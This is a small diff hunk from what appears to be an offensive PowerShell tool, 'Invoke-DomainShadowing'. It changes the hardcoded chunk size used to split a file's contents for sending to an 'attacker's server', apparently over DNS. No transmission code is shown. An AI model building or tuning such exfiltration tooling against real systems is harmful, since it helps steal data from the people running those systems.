@@ -7,7 +7,7 @@ function Invoke-DomainShadowing {
         [string]$ServerAddress  # Attacker's server IP address
     )
 
-    $ChunkSize = 63  # Hardcoded chunk size
+    $ChunkSize = 18  # Hardcoded chunk size
 
     # Function to split the file content into chunks of equal size
     function Split-FileIntoChunks {
